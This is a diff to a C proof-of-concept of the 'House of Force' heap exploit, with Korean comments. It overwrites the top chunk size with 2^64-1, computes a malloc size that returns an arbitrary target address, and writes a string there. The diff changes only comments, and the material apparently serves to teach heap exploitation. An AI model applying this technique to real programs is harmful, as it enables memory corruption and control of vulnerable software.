@@ -25,7 +25,8 @@ int main(){
 
         // top chunk size의 주소 값을 2^64-1로 조작한다.
         *top_chunk_size_addr = 0xffffffffffffffff;
-        // exploit = 임의 주소 - 0x10 - top chunk 주소 - 0x8
+        
+        // target 주소 - 0x10(메타데이터 크기) - top chunk 주소 - 0x8
         exploit_size = target_addr - 0x10 - (__int64_t)top_chunk_size_addr - 0x8;
 
         fprintf(stderr,"exploit_size : 0x%lx\n", exploit_size);
@@ -35,6 +36,8 @@ int main(){
         exploit = malloc(0x100);
 
         fprintf(stderr,"malloc_addr : 0x%x\n", exploit);
+        // malloc에서 리턴된 target 주소에 문자열 복사
+        
         strcpy(exploit, "exploited!!!!!!");
         fprintf(stderr,"target : %s\n", target);
         return 0;
